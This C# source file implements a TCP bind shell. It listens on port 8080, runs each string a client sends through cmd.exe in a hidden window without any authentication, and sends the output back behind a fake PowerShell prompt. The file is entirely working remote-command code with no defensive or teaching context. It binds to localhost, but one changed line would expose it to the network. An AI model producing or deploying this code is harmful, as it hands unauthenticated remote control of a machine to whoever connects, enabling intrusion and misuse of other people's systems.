using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            // Define IP and Port
            string IP = "127.0.0.1";
            int Port = 8080;

            // Create the listener
            TcpListener listener = new TcpListener(IPAddress.Parse(IP), Port);
            listener.Start();

            // Wait for a connection
            TcpClient client = listener.AcceptTcpClient();
            NetworkStream stream = client.GetStream();

            // Send a message to the client
            byte[] sendbytes = Encoding.ASCII.GetBytes("New Client Connected");
            stream.Write(sendbytes, 0, sendbytes.Length);

            // Receive commands from the client
            while (true)
            {
                byte[] recvbytes = new byte[1024];
                int bytes = stream.Read(recvbytes, 0, recvbytes.Length);
                string receivedText = Encoding.ASCII.GetString(recvbytes, 0, bytes);

                // Execute the command and send the output back to the client
                string output = ExecuteCommand(receivedText);
                string sendback = "PS " + Directory.GetCurrentDirectory() + "> " + output;
                sendbytes = Encoding.ASCII.GetBytes(sendback);
                stream.Write(sendbytes, 0, sendbytes.Length);
            }
        }

        private static string ExecuteCommand(string command)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C " + command;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
            return process.StandardOutput.ReadToEnd();
        }
    }
}
